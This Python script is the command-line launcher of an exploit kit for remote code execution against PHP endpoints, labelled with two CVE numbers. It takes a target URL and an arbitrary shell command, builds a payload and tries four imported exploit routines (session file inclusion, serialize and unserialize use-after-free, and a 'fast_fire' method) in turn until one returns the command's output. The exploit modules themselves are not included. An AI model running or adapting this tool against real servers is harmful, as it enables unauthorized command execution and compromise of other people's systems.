#!/usr/bin/env python3
from __future__ import annotations

import argparse
import random
import sys
from urllib.parse import urlparse

from exploits.common import ALNUM, build_payload
from exploits.session_lfi import session_lfi
from exploits.serialize_uaf import serialize_uaf
from exploits.unserialize_uaf import unserialize_uaf
from exploits.fast_fire import fast_fire

EXPLOITS = [session_lfi, serialize_uaf, unserialize_uaf, fast_fire]


def main():
    ap = argparse.ArgumentParser(description="php-rce — CVE-2026-109618/109619")
    ap.add_argument("--url", required=True, help="target PHP endpoint URL")
    ap.add_argument("--cmd", required=True, help="shell command to execute")
    args = ap.parse_args()

    u = urlparse(args.url)
    if u.scheme not in ("http", "https") or not u.hostname:
        sys.exit("url must be a full http(s) URL")

    sid = "a" + "".join(random.choices(ALNUM, k=25))
    marker, payload = build_payload(args.cmd)

    print(f"target: {args.url}  cmd: {args.cmd}\n")

    for fn in EXPLOITS:
        print(f"trying {fn.__name__} ...")
        out = fn(args.url, args.cmd, sid, marker, payload)
        if out:
            print(f"\n{out}")
            return
        print()

    print("all exploits exhausted")
    sys.exit(1)


if __name__ == "__main__":
    main()
